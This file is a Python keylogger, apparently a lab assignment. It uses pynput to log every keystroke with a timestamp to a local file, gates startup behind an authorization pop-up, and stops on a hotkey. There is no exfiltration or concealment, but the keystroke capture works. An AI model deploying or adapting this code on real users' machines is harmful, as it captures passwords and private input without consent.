import tkinter as tk                # Warning Pop-ups
from tkinter import messagebox      # Message dialogs
from pynput import keyboard         # Listening to Keyboard
from datetime import datetime       # Timestamp Keystrokes
import threading                    # Run Keylogger and Hotkey monitor together
import os                           # Force exit

LOG_FILE = "keylog.txt"
listener = None

"""
[Requirement #2, #5, #7]
Append line of text to log file 
@param line : text to be written in log file
@exception if log file cannot be opened/written
"""
def write_log(line):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(line + "\n")
    except Exception as e:
        print(f"[ERROR] Could not write to log file: {e}")

"""
[Requirement #1, #2, #3, #7]
Callback function triggered for every keystroke
- key to readable format, add timestamp, then write to file
@param key : object representing key pressed
@exception if any errors caught in pressed key
"""
def on_press(key):
    try:
        # Format printable characters
        if hasattr(key, 'char') and key.char is not None:
            key_str = key.char
        else:
            key_str = f"[{key.name.upper()}]"

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"{timestamp} - {key_str}")
        write_log(f"{timestamp} - {key_str}")

    except Exception as e:
        print(f"[ERROR] Exception in on_press: {e}")

"""
[Requirement #1, #5, #7]
Start keylogging session
- adds session start marker in log file 
@exception if listener fails to start
"""
def start_keylogger():
    global listener
    write_log("\n[SESSION START]")
    print("[INFO] Keylogger started. Press Ctrl + Shift + Q to stop.")

    try:
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except Exception as e:
        print(f"[ERROR] Failed to start keylogger: {e}")
        write_log(f"[ERROR] Failed to start keylogger: {e}")

"""
[Requirement #3, #4, #5]
Stop keylogging session
- adds session end marker in log file 
@exception if listener fails to stop
"""
def stop_keylogger():
    global listener
    write_log("[SESSION END]")
    print("[INFO] Hotkey pressed. Stopping keylogger.")
    if listener:
        try:
            listener.stop()
        except Exception as e:
            print(f"[ERROR] Could not stop listener: {e}")
            write_log(f"[ERROR] Could not stop listener: {e}")
    os._exit(0)  # Force exit

"""
[Requirement #4, #7]
Monitor global hotkey (Ctrl+Shift+Q) to stop keylogger
@exception if hotkey registration fails
"""
def monitor_hotkey():
    try:
        with keyboard.GlobalHotKeys({
            '<ctrl>+<shift>+q': stop_keylogger
        }) as h:
            h.join()
    except Exception as e:
        print(f"[ERROR] Failed to register hotkey: {e}")
        write_log(f"[ERROR] Failed to register hotkey: {e}")

"""
[Requirement #6, #7]
Display confirm dialog to ensure safe authorized use
@return boolean : if true, authorizes environment
                  if false, program will exit
"""
def show_authorization_message():
    # Warning pop-up to notify users
    root = tk.Tk()
    root.withdraw()

    message = (
        "This keylogger is designed to only be used for authorized lab virtual machines "
        "and sandbox environments. Do you confirm that this is an authorized environment?"
    )

    result = messagebox.askyesno("Environment Authorization", message)

    if not result:
        messagebox.showinfo("Exit", "You did not confirm. The program will now exit.")

    root.destroy()
    return result

"""
Main Start program 
1) Display authorization message
2) if authorized, start keylogger and monitor for stop hotkey
3) if not authorized, exit program immediately
"""
if __name__ == "__main__":
    # Start keylogger and hotkey monitor in separate threads
    try:
        if show_authorization_message():
            threading.Thread(target=start_keylogger, daemon=True).start()
            monitor_hotkey()
        else:
            os._exit(0)  # Exit if declined by users
    except Exception as e:
        print(f"[ERROR] Unexpected error in main thread: {e}")
        write_log(f"[ERROR] Unexpected error in main thread: {e}")
